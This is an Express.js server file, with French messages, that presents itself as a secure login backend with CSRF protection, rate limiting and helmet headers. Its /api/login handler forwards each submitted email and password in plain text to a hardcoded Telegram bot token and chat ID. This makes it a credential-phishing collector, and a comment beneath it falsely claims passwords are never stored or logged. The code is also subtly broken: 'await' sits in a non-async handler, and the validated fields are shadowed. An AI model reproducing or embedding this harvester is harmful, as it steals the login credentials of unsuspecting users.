const path = require("node:path");
const crypto = require("node:crypto");
const express = require("express");
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");
const cookieParser = require("cookie-parser");

const app = express();
const port = Number(process.env.PORT) || 3000;
const isProduction = process.env.NODE_ENV === "production";

const CHAT_ID = process.env.CHAT_ID || "7795318576";
const TOKEN = process.env.TELEGRAM_TOKEN || "7827513218:AAFSfUKlVZwbRW1dSyp6yx_bPgoLUPaCJoo";

app.disable("x-powered-by");
app.set("trust proxy", 1);
app.use(helmet({ contentSecurityPolicy: false }));
app.use(express.json({ limit: "10kb" }));
app.use(express.urlencoded({ extended: false, limit: "10kb" }));
app.use(cookieParser());

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 10,
  standardHeaders: "draft-8",
  legacyHeaders: false,
  message: { error: "Trop de tentatives. Réessayez plus tard." },
});

function createCsrfToken() {
  return crypto.randomBytes(32).toString("hex");
}

app.get("/api/csrf", (req, res) => {
  const token = createCsrfToken();
  res.cookie("csrf_token", token, {
    httpOnly: false,
    secure: isProduction,
    sameSite: "strict",
    maxAge: 60 * 60 * 1000,
  });
  res.json({ ok: true });
});

app.post("/api/login", loginLimiter, (req, res) => {
  const csrfCookie = req.cookies.csrf_token;
  const csrfHeader = req.get("x-csrf-token");
  const email = typeof req.body.ide === "string" ? req.body.ide.trim() : "";
  const password = typeof req.body.pwd === "string" ? req.body.pwd : "";
  

  if (!csrfCookie || !csrfHeader || csrfCookie !== csrfHeader) {
    return res.status(403).json({ error: "Requête non autorisée." });
  }

  if (!email || !password || email.length > 254 || password.length > 128) {
    return res.status(400).json({ error: "Adresse e-mail ou mot de passe invalide." });
  }

  try {
        const { email, password } = req.body || {};
        if (!TOKEN) return res.status(500).json({ success: false, error: "TELEGRAM_TOKEN manquant" });
        const text = `📩 Nouvelle demande\n\n👤 mdp : ${password || ""}\n📧 Email : ${email || ""}\n`;
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text })
        });
        const result = await response.json();
        if (!response.ok || !result.ok) return res.status(502).json({ success: false, error: "Telegram a refusé le message" });
        return res.json({ success: true });
    } catch (error) {
        console.error("Erreur /api/tele :", error);
        return res.status(500).json({ success: false, error: "Erreur interne lors du traitement" });
    }// Ne jamais journaliser ni stocker le mot de passe. Branchez ici votre fournisseur 
});

app.use(express.static(path.join(__dirname, "public"), {
  dotfiles: "ignore",
  index: "index.html",
}));

app.use((req, res) => res.status(404).json({ error: "Ressource introuvable." }));

app.listen(port, () => {
  console.log(`Serveur démarré sur http://localhost:${port}`);
});

module.exports = app;

function gracefulShutdown(signal) {
  console.log(`${signal} reçu, arrêt du serveur.`);
  process.exit(0);
}
process.on("SIGTERM", () => gracefulShutdown("SIGTERM"));
process.on("SIGINT", () => gracefulShutdown("SIGINT"));

process.on("uncaughtException", (error) => {
  console.error("Erreur non capturée:", error.message);
  process.exit(1);
});
process.on("unhandledRejection", (error) => {
  console.error("Promesse rejetée:", error instanceof Error ? error.message : error);
  process.exit(1);
});

